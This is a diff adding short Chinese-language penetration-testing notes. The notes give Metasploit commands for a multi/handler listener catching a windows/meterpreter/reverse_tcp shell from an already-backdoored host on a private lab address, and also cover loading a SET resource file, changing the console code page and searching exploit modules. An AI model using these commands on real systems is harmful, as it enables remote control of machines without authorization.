@@ -1,0 +1,18 @@
+后门设置好后，加载payload
+msf > use multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 192.168.159.140
+msf exploit(handler) > set LPORT 12345
+msf exploit(handler) > exploit
+==============================================================================================
+加载已经存在的payload模块
+>resource /root/.set/meta_config
+==============================================================================================
+修改cmd命令页面编码为utf-8
+>chcp 65001
+[change code page]显示或设置活动代码页编号
+
+
+===============================================================================================
+msf搜索漏洞模块
+>search type:exploit date:2020 -p windows -s name
